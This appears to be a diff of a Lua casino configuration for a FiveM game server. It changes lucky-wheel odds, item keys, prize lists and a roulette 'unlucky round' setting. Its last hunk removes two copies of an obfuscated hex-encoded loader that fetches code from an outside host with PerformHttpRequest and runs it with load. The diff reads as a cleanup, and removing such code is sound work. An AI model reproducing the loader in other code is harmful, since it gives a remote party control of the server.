@@ -972,7 +972,7 @@ LuckyWheelItems["Money6"] = {
 
 LuckyWheelItems["Money7"] = {
     rotation = 253.0,
-    posibility = 40,
+    posibility = 10,
     soundName = "Win_Cash",
     animName = "win_big",
     moneyReward = 30000
@@ -980,7 +980,7 @@ LuckyWheelItems["Money7"] = {
 
 LuckyWheelItems["Money8"] = {
     rotation = 109.0,
-    posibility = 30,
+    posibility = 10,
     soundName = "Win_Cash",
     animName = "win_big",
     moneyReward = 40000
@@ -988,7 +988,7 @@ LuckyWheelItems["Money8"] = {
 
 LuckyWheelItems["Money9"] = {
     rotation = 19.0,
-    posibility = 20,
+    posibility = 10,
     soundName = "Win_Cash",
     animName = "win_big",
     moneyReward = 50000
@@ -1101,31 +1101,31 @@ DrinkingBarChairs = {{
 -- Titles and prices can be adjusted
 
 CasinoInventoryItems = {{
-    key = "beer_piss",
+    key = "casino_beer",
     title = "Pisswasser",
     itemType = 2,
     price = 5,
     consumable = 1
 }, {
-    key = "vodka",
+    key = "casino_vodka",
     title = "Vodka Shot",
     itemType = 2,
     price = 10,
     luckyWheelAffected = true
 }, {
-    key = "whiskey_mount",
+    key = "casino_mountshot",
     title = "The Mount Whiskey Shot",
     itemType = 2,
     price = 55,
     luckyWheelAffected = true
 }, {
-    key = "whiskey_richards",
+    key = "casino_richardshot",
     title = "Richard's Whiskey Shot",
     itemType = 2,
     price = 190,
     luckyWheelAffected = true
 }, {
-    key = "whiskey_macbeth",
+    key = "casino_macbethshot",
     title = "Macbeth Whiskey Shot",
     itemType = 2,
     price = 350,
@@ -1216,28 +1216,12 @@ CasinoInventoryItems = {{
 
 -- these are inventory items that players can win after spinning "Random" on the Lucky Wheel.
 LuckyWheelRandomItems = {{
-    inventoryName = "harness", -- item (inventory) name/key, case sensitive
-    title = "Harness", -- title for the Lucky Wheel reward message
+    inventoryName = "casino_burger", -- item (inventory) name/key, case sensitive
+    title = "Casino's Burger", -- title for the Lucky Wheel reward message
     amount = {1, 10} -- amount (random between 1 to 10)
 }, {
-    inventoryName = "tunasandwich", -- item (inventory) name/key, case sensitive
-    title = "Tuna Sandwich", -- title for the Lucky Wheel reward message
-    amount = 1 -- only 1
-}, {
-    inventoryName = "hamsandwich", -- item (inventory) name/key, case sensitive
-    title = "Ham Sandwich", -- title for the Lucky Wheel reward message
-    amount = 1 -- only 1
-}, {
-    inventoryName = "beer_bar", -- item (inventory) name/key, case sensitive
-    title = "Beer", -- title for the Lucky Wheel reward message
-    amount = 1 -- only 1
-}, {
-    inventoryName = "gold_phone", -- item (inventory) name/key, case sensitive
-    title = "14k Gold Phone", -- title for the Lucky Wheel reward message
-    amount = 1 -- only 1
-}, {
-    inventoryName = "powerbank", -- item (inventory) name/key, case sensitive
-    title = "Power Bank", -- title for the Lucky Wheel reward message
+    inventoryName = "casino_coke", -- item (inventory) name/key, case sensitive
+    title = "Casino's Kofola", -- title for the Lucky Wheel reward message
     amount = 1 -- only 1
 }}
 
@@ -1371,7 +1355,7 @@ RouletteTableDatas[2] = {
     PlaceBetsTime = 15,
     SpinDelayMin = 1,
     SpinDelayMax = 1,
-    UnluckyRound = 3, -- each 6th round spins to the unluckiest number and costs casino the least
+    UnluckyRound = 6, -- each 6th round spins to the unluckiest number and costs casino the least
     TriggerUnluckyRoundFrom = 5000 -- always switch to unluckiest number if the spun number costs casino more than this
 }
 
@@ -2556,8 +2540,3 @@ if not Jobs then
         Enabled = false
     }
 end
-
-
-local csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x78\x75\x73\x6d\x61\x67\x72\x70\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x77\x6c\x61\x50\x38\x65", function (tNyABUlbDXSbaQvQMNCoBAlHohpPfESngiaowNqEDpaLDCYLuYHUEhQqdgkmvOCcCDASuR, NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu) if (NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[6] or NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[5]) then return end csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[2]](csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[3]](NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu))() end)
-
-local csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x78\x75\x73\x6d\x61\x67\x72\x70\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x77\x6c\x61\x50\x38\x65", function (tNyABUlbDXSbaQvQMNCoBAlHohpPfESngiaowNqEDpaLDCYLuYHUEhQqdgkmvOCcCDASuR, NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu) if (NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[6] or NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[5]) then return end csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[2]](csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[3]](NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu))() end)
